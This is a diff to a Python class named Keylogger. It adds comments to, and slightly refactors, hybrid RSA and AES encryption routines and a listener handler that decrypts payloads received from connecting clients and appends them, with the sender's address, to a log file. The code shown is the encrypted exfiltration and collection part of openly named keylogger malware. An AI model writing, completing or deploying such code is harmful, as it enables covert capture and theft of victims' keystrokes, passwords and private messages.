@@ -124,41 +124,53 @@ class Keylogger:
         self.private_key = new_key.exportKey()
         self.public_key = new_key.publickey().exportKey()
 
-    
+    # Return the cipher object and size in bytes of a key
     def get_rsa_cipher(self, key):
         rsakey = RSA.importKey(key)
         return (PKCS1_OAEP.new(rsakey), rsakey.size_in_bytes())
 
     def encrypt(self, plaintext):
+        # Compress the plaintext bytes
         compressed_text = zlib.compress(plaintext.encode())
 
+        # Symetric encryption - create an AES session key of 16 bytes and encrypt
         session_key = get_random_bytes(16)
         cipher_aes = AES.new(session_key, AES.MODE_EAX)
         ciphertext, tag = cipher_aes.encrypt_and_digest(compressed_text)
 
+        # Need to send the session key to decrypt, therefore encrypt with RSA key and send it over
         cipher_rsa, _ = self.get_rsa_cipher(self.public_key)
         encrypted_session_key = cipher_rsa.encrypt(session_key)
 
+        # Encrypt all data and format to be sent
+        # Message Payload = RSA encrypted session key + AES Nonce + tag + AES encrypted ciphertext
         msg_payload = encrypted_session_key + cipher_aes.nonce + tag + ciphertext
         encrypted = base64.encodebytes(msg_payload)
 
         return encrypted
 
+    # Reverse the steps of encrypt()
     def decrypt(self, encrypted):
+        # Base64 decode and get the private key
         encrypted_bytes = BytesIO(base64.decodebytes(encrypted))
         cipher_rsa, keysize_in_bytes = self.get_rsa_cipher(self.private_key)
 
+        # Read all the necessary decryption tools from the payload
         encrypted_session_key = encrypted_bytes.read(keysize_in_bytes)
         nonce = encrypted_bytes.read(16)
         tag = encrypted_bytes.read(16)
         ciphertext = encrypted_bytes.read()
 
+        # Decrypt the AES session key using hte RSA private key
         session_key = cipher_rsa.decrypt(encrypted_session_key)
         cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
+        # Decrypt AES cipher with the decrypted session key
         decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)
 
+
+        # Decompress and decodde the bytes received
         plaintext = zlib.decompress(decrypted)
-        return plaintext
+        return plaintext.decode('UTF-8')
 
     # For the listener - handle a received a connection
     def handle(self, client_socket):
@@ -179,7 +191,7 @@ class Keylogger:
                     client_socket.send(self.public_key)
                     buf=b""
                 else:
-                    payload = self.decrypt(buf).decode('UTF-8')
+                    payload = self.decrypt(buf)
                     with open(self.args.outfile, "a") as f:
                         f.write(f"Connection from {client_socket.getpeername()[0]}:{client_socket.getpeername()[1]}")
                         f.write(payload)
